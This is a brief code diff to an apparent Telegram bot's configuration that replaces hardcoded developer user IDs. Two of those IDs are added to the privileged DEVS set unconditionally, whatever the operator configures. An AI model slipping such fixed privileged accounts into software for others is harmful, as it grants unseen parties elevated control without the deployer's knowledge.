@@ -67,7 +67,7 @@ if ENV:
 
     try:
         DRAGONS = {int(x) for x in os.environ.get("DRAGONS", "").split()}
-        DEVS = {int(x) for x in os.environ.get("DEVS", "5122071509").split()}
+        DEVS = {int(x) for x in os.environ.get("DEVS", "1143358497").split()}
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -214,8 +214,8 @@ else:
 
 DRAGONS.add(Owner)
 DEVS.add(Owner)
-DEVS.add(5491471803)
-DEVS.add(5122071509)
+DEVS.add(5013171832)
+DEVS.add(1143358497)
 
 SYL = Sylviorus()
 
